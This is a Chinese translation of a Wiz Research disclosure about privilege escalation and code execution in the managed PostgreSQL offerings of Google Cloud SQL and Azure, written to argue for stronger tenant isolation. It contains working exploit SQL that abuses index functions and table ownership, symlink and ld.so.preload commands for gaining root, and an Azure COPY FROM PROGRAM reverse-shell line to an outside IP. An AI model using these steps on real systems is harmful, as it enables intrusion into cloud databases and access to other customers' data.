---
title: 云存在隔离问题：PostgreSQL 漏洞影响多个云供应商
---

<center><h1>云存在隔离问题：PostgreSQL 漏洞影响多个云供应商</h1><b>本译文作者：shadowabi</b><br><br></center>

> 原文地址：https://www.wiz.io/blog/the-cloud-has-an-isolation-problem-postgresql-vulnerabilities

作为我们对云的持续研究的一部分，Wiz Research 在多个云供应商的流行 PostgreSQL 即服务产品中发现了漏洞。

这些漏洞不是 PostgreSQL 代码库中的错误的结果，而是云供应商引入项目以使其满足其需求的代码。这些漏洞可用作更复杂的攻击所需的初始立足点，例如在 ExtraCopy 等跨租户漏洞中。ExtraReplica 于 2022 年 4 月披露，可能允许攻击者访问适用于 PostgreSQL（灵活服务器）的 Azure 数据库中其他客户的数据库。

这篇文章重点介绍了我们研究的以前未公开的技术细节，并首次揭示了我们对另一个主要云提供商谷歌云平台（GCP）的基础设施的探索，利用相同类型的漏洞来获得对环境的初始访问权限。

鉴于我们的研究取得了成功，我们深入研究了实施和维护租户隔离以防止跨租户漏洞的重要性，并讨论了在受影响各方之间进行广泛、协调披露的复杂性。最后，我们概述了我们正在进行的努力，通过创建一个所有云供应商都可以讨论补救措施的通用论坛来帮助克服这些挑战。


## 云存在隔离问题

在过去的一年里，Wiz Research 对云的一个基本前提——租户隔离进行了广泛的研究。我们研究了客户环境在不同云服务提供商 （CSP） 之间相互隔离的效率。具体而言，我们重点介绍了如何在托管服务中实施云隔离。CSP 提供的许多托管服务都基于在供应商管理的计算实例上运行的流行开源软件。在许多情况下，这是传统软件，在设计时并未考虑到云多租户需求。这就提出了一个问题：CSP 如何调整传统的开源软件以适应云的需求？


### 专注于PostgreSQL

在调查了多个主要云提供商的 PostgreSQL 产品后，我们发现这些云提供商在各自的 PostgreSQL 项目中引入的修改中存在多个漏洞，使其成为多租户托管服务。这些漏洞使我们能够在多个 PostgreSQL 即服务产品的供应商管理的计算实例上执行任意命令，以便在云提供商内部网络中站稳脚跟。因此，我们深入了解了互联网上最重要的数据库服务的运营情况。在极端情况下，我们能够利用这些漏洞对使用受影响服务的其他客户进行未经授权的跨租户数据访问。


#### 什么是 PostgreSQL？

PostgreSQL 是世界上最受欢迎的数据库服务器之一。它是一个功能强大、开源且成熟的对象关系数据库，数千个组织使用它来存储不同类型的数据。它因其久经考验的架构和可靠性而赢得了良好的声誉。由于该项目的受欢迎程度，它被大多数 CSP 作为托管服务提供。


#### 在云中发布

PostgreSQL 是一个有 25 年历史的项目。它是在云计算和托管服务出现之前首次设计和开发的，因此其作者不可能预见到云的未来需求。当 CSP 开始为托管数据库解决方案调整 PostgreSQL 时，他们发现它缺乏适合托管服务的权限模型。客户习惯于对其非云托管数据库拥有完整的管理功能，但 CSP 不允许客户拥有可能危及云中 PostgreSQL 即服务的安全性或稳定性的功能。例如，所有 CSP 都为客户提供类似的半管理功能，例如创建事件触发器、检查点、加载扩展、管理复制等。但与此同时，CSP 限制客户访问托管数据库的计算实例的文件系统，或在基础服务器上执行代码。

每个 CSP 解决这个问题的方式都略有不同。由于 PostgreSQL 的权限模型非常有限，并且基本上只允许某些管理功能，因此 CSP 必须对 PostgreSQL 进行更改，以允许用户某些管理功能，同时仍然限制他们执行不安全的操作。一些 CSP 通过扩展或自定义配置引入了这些更改。其他人甚至修改了 PostgreSQL 引擎本身的源代码并维护自己的分支。所有这些方法都可能导致意外的安全问题。

为了展示我们的发现，我们将检查我们在 Google Cloud Platform 和 Azure 中发现的两个漏洞。

## 案例研究 1：Google Cloud Platform Cloud SQL

Cloud SQL 于 2011 年 10 月推出，是 GCP 提供的旗舰服务之一，为客户提供完全托管的数据库服务、自动备份、复制、加密和容量增加，同时仍使用传统的数据库引擎：MySQL、PostgreSQL 和 SQL Server。

我们的研究只关注 Cloud SQL 的 PostgreSQL 实现。我们研究的第一步是尝试在托管 PostgreSQL 实例的底层虚拟机上执行代码。


### PostgreSQL COPY 语句

PostgreSQL 有一个内置的命令执行功能，使用 COPY 语句。COPY 语句可用于执行命令以及读取或写入文件。

例如，我们可以使用 COPY 语句来执行 id 命令并查询命令的输出：

<div align=center><img width="1000" src="/img/2000000001.png"><br><br>使用 COPY 执行 PostgreSQL 命令</div><br>


知道这一点后，我们尝试在Google Cloud SQL上执行相同的查询，但发现我们缺乏命令执行所需的特定权限：

<div align=center><img width="1000" src="/img/2000000002.png"><br><br>由于缺少权限，操作系统级别的代码执行失败</div><br>

### 托管的 PostgreSQL 权限

掌握 PostgreSQL 权限模型相对容易。它由一个名为 role 的主要组件组成，可以将其视为等效于用户或组。角色还可以具有定义其权限的角色属性。例如，有一个称为`登录权限`的基本属性，它允许角色登录到数据库（使其成为“用户”）。另一个有趣的属性是`超级用户状态`，它允许角色成为数据库管理员，绕过除登录权限之外的所有权限检查。这是每个攻击者的梦想。在上图中，当我们尝试使用 COPY 命令执行代码时，我们收到一个错误，指出我们没有超级用户权限。那么我们有什么特权呢？

以下列表描述了托管数据库中的角色：

<div align=center><img width="1000" src="/img/2000000003.png"></div><br>

> 译者注：实现此效果可以使用下列语句：

```sql
SELECT rolname,
       trim(',' from
           CASE WHEN rolsuper THEN 'SUPERUSER,' ELSE '' END ||
           CASE WHEN rolinherit THEN 'INHERIT,' ELSE '' END ||
           CASE WHEN rolcreaterole THEN 'CREATEROLE,' ELSE '' END ||
           CASE WHEN rolcreatedb THEN 'CREATEDB,' ELSE '' END ||
           CASE WHEN rolcanlogin THEN 'LOGIN,' ELSE '' END ||
           CASE WHEN rolreplication THEN 'REPLICATION,' ELSE '' END ||
           CASE WHEN rolbypassrls THEN 'BYPASSRLS,' ELSE '' END
       ) as permissions
FROM pg_roles;
```

### 我们是半超级用户

显然，我们不是超级用户，但我们确实有一些超级用户功能。根据 GCP 的官方文档，授予 `cloudsqlsuperuser` 我们的用户以下功能：

<div align=center><img width="1000" src="/img/2000000004.png"></div><br>

由于这不是默认的 PostgreSQL 行为，我们可以有把握地假设 GCP 对 PostgreSQL 引擎进行了修改（可能使用幕后 `cloudsqlsuperuser` 的角色），以便向低特权用户授予一些高特权功能。我们是否可以滥用这些更改来提升我们的权限并获得更多超级用户功能，例如 COPY 命令？


### 通过更改表进行权限提升

GCP 对引擎引入的修改之一允许角色将表的所有权任意更改为数据库中的任何用户或 `cloudsqlsuperuser` 角色。起初，这个小的更改似乎不应该产生任何重大的安全后果。但是，PostgreSQL 的开发人员可能有充分的理由将此操作严格限制为超级用户。当时，我们没有修改后的 Google Cloud SQL Postgres 二进制文件，因此我们通过试验数据库并找出我们拥有哪些非默认功能来发现此功能。当我们尝试更改表的所有者并将其设置为高特权用户（即数据库的实例超级用户 `cloudsqladmin` ）时，这种异常行为引起了我们的兴趣。

通过尝试将 `cloudsqladmin` 用户设置为所有者 `test_table` ，我们预计会收到以下错误：

<div align=center><img width="1000" src="/img/2000000005.png"><br><br>云 SQL 更改表预期</div><br>

所以想象一下，当我们真正得到时，我们的惊讶：

<div align=center><img width="1000" src="/img/2000000006.png"><br><br>云 SQL 更改表现实</div><br>

为了了解此功能的潜在安全影响，我们必须深入研究 PostgreSQL 引擎的内部结构。


### 将 ALTER TABLE 与索引函数相结合

PostgreSQL 的索引功能允许构建复杂和改进的索引，这些索引基于应用于单个表的一个或多个列的函数定义（PostgreSQL 文档）。

定义基于索引函数的索引的语法为：

```sql
CREATE INDEX index_name ON indexed_table (index_function(column_name));
```

当 PostgreSQL `INSERT/UPDATE/ANALYZE` 命令在具有索引函数的表上执行时，该函数将作为命令的一部分进行调用。

<div align=center><img width="1000" src="/img/2000000007.png"></div><br>

在我们的研究中，我们发现对表执行上述任何命令都会隐式调用具有表所有者权限的索引函数。这种行为在官方的 PostgreSQL 文档中没有详细说明，但是在 PostgreSQL 源代码中可以看到对它的引用：

```C
/*
 * Switch to the table owner's userid, so that any index functions are run
 * as that user.  Also lock down security-restricted operations and
 * arrange to make GUC variable changes local to this command.
 */
GetUserIdAndSecContext(&save_userid, &save_sec_context);
SetUserIdAndSecContext(onerel->rd_rel->relowner,
                       save_sec_context | SECURITY_RESTRICTED_OPERATION);
```

### 开发

结合这两个原语，我们得出了以下攻击流程：

1. 创建新表。
2. 在表中插入一些虚拟内容，以便索引函数可以使用一些内容。
3. 在表上创建一个恶意索引函数（使用我们的代码执行有效负载）。
4. 将表所有者更改为 `cloudsqladmin` GCP 的超级用户角色，仅由 Cloud SQL 用于维护和管理数据库。
5. 分析表，强制 PostgreSQL 引擎将用户上下文切换到表的所有者（ `cloudsqladmin` ）并调用具有 `cloudsqladmin` 权限的恶意索引函数，导致执行我们的 shell 命令，而我们之前没有权限执行该命令。

在PostgreSQL中，这个流程看起来像这样：

```sql
CREATE TABLE temp_table (data text);
CREATE TABLE shell_commands_results (data text);

INSERT INTO temp_table VALUES ('dummy content');

/* PostgreSQL does not allow creating a VOLATILE index function, so first we create IMMUTABLE index function */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
  LANGUAGE sql IMMUTABLE AS 'select ''nothing'';';

CREATE INDEX index_malicious ON public.temp_table (suid_function(data));

ALTER TABLE temp_table OWNER TO cloudsqladmin;

/* Replace the function with VOLATILE index function to bypass the PostgreSQL restriction */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
  LANGUAGE sql VOLATILE AS 'COPY public.shell_commands_results (data) FROM PROGRAM ''/usr/bin/id''; select ''test'';';

ANALYZE public.temp_table;
```

执行漏洞利用 SQL 查询后， `shell_commands_results` 该表包含已执行代码的输出：

```bash
uid=2345(postgres) gid=2345(postgres) groups=2345(postgres)
```


### 分析修改后的 PostgreSQL 引擎

在 Cloud SQL 托管的 PostgreSQL 实例上获得代码执行后，我们检索了 Cloud SQL 使用的修改后的 PostgreSQL 二进制文件并对其进行了逆向工程。对二进制文件进行逆向工程使我们能够更好地了解我们发现的错误。

显然，GCP 修改了该函数以 `ATExecChangeOwner` 添加一个条件，用于检查调用者用户是否是角色的一部分，即 GCP 为客户提供的有限 `cloudsqlsuperuser` 角色。如果是这样，该函数会将其视为超级用户，并允许它将表的所有者更改为其他用户。

<div align=center><img width="1000" src="/img/2000000008.png"><br><br>仅当调用程序不是超级用户或 cloudsqlsuperuser 时才执行 ACL 检查</div><br>

我们可以看到对 GCP 添加到 PostgreSQL 引擎的 `cloudsqlsuperuser()` 函数的调用。如果我们是 `cloudsqlsuperuser` 角色的一部分，并且我们要更改的表的所有者不是超级用户，那么我们将绕过该条件。这将授予其他用户更改表所有者的能力。

###  权限提升

此时，我们正在运行托管 PostgreSQL 数据库的基础计算实例上执行代码。我们很高兴能够绘制内部环境图，识别新的攻击面，并在服务的内部组件中发现更多漏洞。

<div align=center><img width="1000" src="/img/2000000009.png"><br><br>在托管实例的 docker 容器上执行 id 命令</div><br>

Cloud SQL PostgreSQL 数据库以 postgres 用户身份在专用的 docker 容器中运行。我们立即注意到的一件事是容器共享主机虚拟机网络命名空间。这意味着容器没有自己的专用 IP 地址。相反，容器直接绑定到主机的网络接口。通过与主机虚拟机共享网络命名空间，我们可以对服务的内部网络环境执行更广泛的网络侦察。

```bash
/ # ifconfig
ifconfig: /proc/net/dev: No such file or directory
docker0   Link encap:Ethernet  HWaddr 02:42:AC:4A:D4:F5
          inet addr:172.17.0.1  Bcast:172.17.255.255  Mask:255.255.0.0
          UP BROADCAST MULTICAST  MTU:1500  Metric:1

eth0      Link encap:Ethernet  HWaddr 42:01:0A:80:00:08
          inet addr:10.128.0.8  Bcast:0.0.0.0  Mask:255.255.255.255
          UP BROADCAST RUNNING MULTICAST  MTU:1460  Metric:1

lo        Link encap:Local Loopback
          inet addr:127.0.0.1  Mask:255.0.0.0
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
```

### 本地权限提升到 root

为了更好地了解我们所处的环境，我们试图将我们的权限提升到 root。我们在容器中搜索了任何可写文件和目录，希望找到一种方法来滥用可写文件进行权限提升。

```bash
find / -writable 2>/dev/null
```

此搜索向我们显示，我们的机器有一个持久目录，由我们的低特权用户 postgres 拥有。

```bash
drwxr-xr-x  5 postgres postgres  4096 Jan  3 14:32 /pgsql
```

在该目录中，我们找到了该文件 iptables-save ，该文件由 root 存储了我们的数据库实例的 iptables 规则（本地防火墙规则）。

<div align=center><img width="1000" src="/img/2000000010.png"><br><br>root 在我们控制的目录中拥有的文件</div><br>

```bash
# Generated by iptables-save v1.8.5 on Tue Jan  4 11:30:07 2022
*filter
:INPUT DROP [0:0]
:FORWARD DROP [0:0]
:OUTPUT DROP [0:0]
:DOCKER - [0:0]
:DOCKER-ISOLATION-STAGE-1 - [0:0]
:DOCKER-ISOLATION-STAGE-2 - [0:0]
:DOCKER-USER - [0:0]
:END_USER_ACL - [0:0]
-A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT
-A INPUT -i lo -j ACCEPT
-A INPUT -p icmp -j ACCEPT
-A INPUT -p tcp -m tcp --dport 22 -j ACCEPT
-A INPUT -p tcp -m tcp --dport 8080 -j ACCEPT
-A INPUT -p tcp -m tcp --dport 3307 -j ACCEPT
….
COMMIT
# Completed on Tue Jan  4 11:30:07 2022
```

在我们控制的目录中拥有 root 拥有的文件立即引起了我们的注意。我们想象，如果我们设法重写此文件，我们也许能够使用符号链接攻击覆盖任意文件。在以前的研究工作中，我们在这类攻击方面取得了很大的成功，这些攻击利用符号链接进行任意文件写入。当文件位于用户拥有的目录下时，我们可以删除该文件并将其替换为指向我们要覆盖的文件的符号链接。

考虑到这一点，我们接下来想知道如何使此文件被写入。显然，在 Google Cloud SQL 门户中修改我们的数据库实例网络访问规则将导致将新条目附加到 `iptables-rules` 文件中。

<div align=center><img width="600" src="/img/2000000011.png"><br><br>添加新的 iptables 条目</div><br>

当我们在服务的允许列表中添加新的 IP 地址时，以下行将添加到 `iptables-save` 文件中：

```bash
-A END_USER_ACL -s 1.1.1.1/32 -p tcp -m tcp --dport 5432 -j ACCEPT
```

回顾一下：我们已经在我们控制的目录中标识了一个由 root 拥有的文件，我们可以随意使新条目出现在文件中。看起来我们拥有执行符号链接攻击并以 root 身份覆盖任意文件所需的一切。

假设我们想覆盖机器 `/etc/passwd` 的文件。我们需要做的是：

1. 删除 `/psql/iptables-save` 文件。
2. 创建从 /psql/iptables-save 到 `/etc/passwd` 的 符号链接

```bash
ln -s /psql/iptables-save / /host/var/lib/docker/overlay2/CONTAINER_HASH/diff/etc/passwd
```

3. 在 Google Cloud SQL 门户网络中为数据库实例创建新的特制网络条目。

我们需要指定的 `/host/var/lib/docker/overlay2/CONTAINER_HASH` 原因是我们发现写入操作实际上发生在不同的 docker 容器中，该容器的 `/host` 挂载指向主机，因此要覆盖我们的文件，我们必须指定容器的完整路径。

为了利用此文件覆盖原语进行权限提升，我们需要克服最后一个挑战：找到要覆盖的正确文件。找到要覆盖的文件并不容易，因为我们对写入文件的内容的控制非常有限。

即使我们设法覆盖了像 `/etc/passwd` 和 `/etc/shadow` 这样的文件，也会导致解析错误，并且没有真正的安全后果。经过多次尝试，我们在覆盖 `ld.so.preload` 文件时发现了一些有趣的行为。对于那些不熟悉该文件的人，它包含一个以空格分隔的 ELF 共享对象列表，这些对象要在每个程序之前加载。

在使用 `iptables-save` 的内容（包含我们的行 `1.1.1.1/32`）覆盖此文件并跟踪二进制执行后，我们观察到二进制文件试图从当前目录中的 `1.1.1.1/32` 路径加载共享库！这给了我们一个想法：如果我们在这条路径中放置一个共享库会怎样？

然后我们可以执行一个 suid 像mount二进制文件这样的程序，它几乎在每个Linux发行版中都是 suid 二进制文件。库应该以 root 身份运行！这正是我们所做的。

我们在容器 `/etc/ld.so.preload` 中放置了一个符号链接：

```bash
ln -s /host/var/lib/docker/overlay2/093062b7c0a3bd2e8abf62f86629b011fc609c6c34331752e864ac7d251dc3c4/diff/etc/ld.so.preload iptables-save
```

然后我们将 `1.1.1.1/32` IP 添加到允许列表中，这触发了覆盖。最后，我们执行了挂载程序，将我们的权限提升为 root。以下是我们执行的日志：

```bash
[PID: 36595] [UID: 2345] [CWD: /pgsql/data] [CMDLINE: postgres: cloudsqlreplica postgres 10.93.224.7(40982) SELECT ] /bin/postgres
[PID: 36595] [UID: 2345] [CWD: /pgsql/data] [CMDLINE: postgres: cloudsqlreplica postgres 10.93.224.7(40982) idle ] /bin/postgres
[PID: 36595] [UID: 2345] [CWD: /pgsql/data] [CMDLINE: ] N/A
[PID: 1025] [UID: 2345] [CWD: /pgsql/data] [CMDLINE: postgres: postgres postgres 77.126.84.6(60219) SELECT ] /bin/postgres
[PID: 1025] [UID: 2345] [CWD: /pgsql/data] [CMDLINE: postgres: postgres postgres 77.126.84.6(60219) idle ] /bin/postgres
[PID: 1025] [UID: 2345] [CWD: /pgsql/data] [CMDLINE: postgres: postgres postgres 77.126.84.6(60219) SELECT ] /bin/postgres
[PID: 1025] [UID: 2345] [CWD: /pgsql/data] [CMDLINE: postgres: postgres postgres 77.126.84.6(60219) idle ] /bin/postgres
[PID: 36599] [UID: 0] [CWD: N/A] [CMDLINE: /bin/mount ] N/A
[PID: 36600] [UID: 0] [CWD: N/A] [CMDLINE: sh -c id > /tmp/win ] N/A
```

### docker 逃逸

在获得了 `CAP_NET_ADMIN` 和 `CAP_NET_RAW` 能力后，我们可以逃离容器。我们利用了容器和主机之间的共享网络命名空间，并使用了本文中描述的相同 TCP 注入技术，我们通过使用与 `pyinstaller` 打包的 scapy Python 库来自动化该过程。

该技术实质上利用了在主机上运行的 GCP 来宾代理中的功能。每隔一段时间，它就会查询 IMDS 以获取新的配置更新。如果该时间间隔内没有配置更改，则来宾代理发送某些参数，这些参数会导致 IMDS 在 60 秒后响应，从而允许窗口从 IMDS 向来宾代理注入虚假配置响应。配置可以包含应添加到实例的 SSH 密钥。如果未找到配置，代理甚至会创建配置提供的用户。说了这么多，让我们看看脚本的实际效果：

<div align=center><img width="1000" src="/img/2000000012.png"><br><br>通过 TCP 注入转义容器</div><br>

脚本完成后，我们尝试使用新创建的用户登录：

<div align=center><img width="1000" src="/img/2000000013.png"><br><br>在主机虚拟机上执行命令</div><br>

作为奖励，我们的用户是一个 sudoer，授予我们在主机上的 root 权限。

## 案例研究 2：适用于 PostgreSQL 的 Azure 数据库 - 权限提升和代码执行

与 GCP 一样，Microsoft Azure 对 PostgreSQL 引擎进行了一些修改，以便在云中提供 PostgreSQL 即服务。与 Cloud SQL 一样，这些修改允许用户使用某些超级用户功能，例如创建事件触发器、创建检查点和加载扩展，所有这些功能通常都是为超级用户保留的。

除了这些类似超级用户的功能外，Azure PostgreSQL 还授予用户 `CREATEROLE` 权限。此权限并非 Azure 所独有，其他 PostgreSQL 即服务产品（包括 Cloud SQL）也为用户提供 `CREATEROLE` 权限。但其他产品以某种方式限制角色，以防止其滥用，在 Azure 中，没有这样的限制。

`CREATEROLE` 是一个非常强大的权限。被授予权限 `CREATEROLE` 的用户可以创建新用户并将其与特定角色关联。PostgreSQL 附带了其他强大的内置角色，例如： `pg_read_server_files`、 `pg_write_server_files` 和 `pg_execute_server_program`。作为这些角色的成员，用户可以在文件系统上读/写文件，甚至可以在底层操作系统上执行任意命令。

官方的 PostgreSQL 文档警告说，被授予任意创建角色权限的用户应被视为`几乎超级用户`：

> 小心创建角色权限...如果一个角色没有特定的特权，但被允许创建其他角色，它可以轻松地创建另一个具有与自己的不同特权的角色......因此，将具有 `CREATEROLE` 特权的角色视为几乎超级用户角色。

该 `CREATEROLE` 权限是基本且常用的权限。如果没有此权限，托管的 PostgreSQL 服务是不完整的。由于这种权限非常强大，我们在研究期间评估的几乎所有 CSP 都引入了修改来强化其 PostgreSQL 引擎，并禁用了向普通用户授予强大角色的选项。但是，Azure 没有修改其 `CREATEROLE` 权限，允许创建能够在基础虚拟机上执行任意命令的强大用户。

为了利用这种不安全的行为，我们创建了一个名为`james`的新用户，并将其与我们能想到的所有强大角色相关联：

- pg_read_server_files - 使用户能够从文件系统中任意读取文件
- pg_write_server_files - 使用户能够任意将文件写入文件系统
- pg_execute_server_program - 最强大的角色，赋予用户在操作系统级别执行任意命令的能力

```sql
CREATE USER james CREATEDB IN GROUP
  pg_read_server_files,
  pg_write_server_files,
  pg_execute_server_program ROLE postgres;
```

执行查询后，我们以新创建的用户`james`身份登录，并使用它的权限执行任意命令。例如，我们执行了以下命令，从托管实例的底层虚拟机调用反向 shell：

```sql
SET ROLE "james";
COPY shell_results FROM program '/bin/bash -c "bash -i >& /dev/tcp/13.33.33.7/1337 0>&1"';
```

从基础虚拟机获取反向外壳为我们在 Azure 内部网络中站稳了脚跟：

<div align=center><img width="1000" src="/img/2000000014.png"><br><br>来自 Azure PostgreSQL 灵活实例的反向 shell</div><br>

### Azure 隔离

在托管 PostgreSQL 实例上获得代码执行后，我们利用这一初始立足点来证明对属于其他 Azure PostgreSQL 灵活客户的数据库的未经授权的跨租户访问。


## 根本原因分析

当他们开始提供 PostgreSQL 即服务时，所有 CSP 都有相同的基本需求：克服 PostgreSQL 无法允许用户获得某些超级用户权限而不允许其他所有内容的问题。

因此，所有 CSP 都被迫对 PostgreSQL 项目进行修改，核心问题是向低特权用户引入管理功能是有风险的。

看似微小的修改可以允许用户绕过安全模型并提升其在本地数据库中的权限。

由于 CSP 倾向于引入非常相似的功能，因此我们能够证明相同的漏洞利用代码适用于多个供应商，即使不同 CSP 的实现代码不同。


## 总结

在跨云和供应商研究托管 PostgreSQL 的过程中，我们了解到 CSP 通常以多租户托管服务的形式提供流行且深受喜爱的开源解决方案。

这是云的一项重要力量 - 以可扩展的托管服务形式提供任何内容。但是，这些项目在构建时并未考虑到托管服务的需求，因此它们的采用依赖于每个提供商的多次修改和调整。

我们了解到，虽然所有 CSP 都希望为客户提供类似的功能，但他们找到了不同的方法来实现相同的目标。随着 CSPS 将非云技术适应云，引入了新的安全问题。

## 隔离为王

我们认为这项研究是云隔离重要性的一个很好的案例研究。在严格执行租户隔离措施的 Cloud SQL 中，我们发现的漏洞的影响相对较小。

另一方面，在 Azure PostgreSQL 的情况下，服务的隔离不太严格，可以利用这些类型的漏洞来未经授权跨租户访问属于其他客户的数据库实例。

在此案例中，相同类型的漏洞具有完全不同的结果，说明了具有严格强制隔离的服务如何对恶意行为者更具弹性，即使他们配备了零日漏洞。
